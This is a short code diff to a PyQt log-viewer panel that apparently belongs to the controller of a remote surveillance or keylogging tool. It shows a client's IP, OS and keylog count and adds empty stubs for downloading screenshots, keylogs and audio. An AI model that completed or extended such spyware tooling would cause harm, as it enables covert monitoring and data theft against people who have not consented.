@@ -36,6 +36,10 @@ class LogViewer(QWidget, logViewerUi):
         self.clientIpLine.setText(self.client_ip_address)
         self.clientOsLine.setText(self.client_os)
 
+        # Hide Progress Bar
+        self.downloadProgress.setHidden(True)
+        self.downloadedLabel.setHidden(True)
+
     def update_date(self):
         self.date = str(self.timeCalendar.selectedDate().toPyDate())
 
@@ -51,3 +55,21 @@ class LogViewer(QWidget, logViewerUi):
         self.keylogsCountLabel.setText(data['payload'])
 
         # Check Audio
+
+    def download_data(self):
+
+        # Show Progress
+        self.downloadProgress.setHidden(False)
+        self.downloadedLabel.setHidden(False)
+
+        # Download Screenshots
+        if self.screenshotsEnableButton.isChecked():
+            pass
+
+        # Download Keylogs
+        if self.keylogsEnableButton.isChecked():
+            pass
+
+        # Download Audio
+        if self.audioEnableButton.isChecked():
+            pass
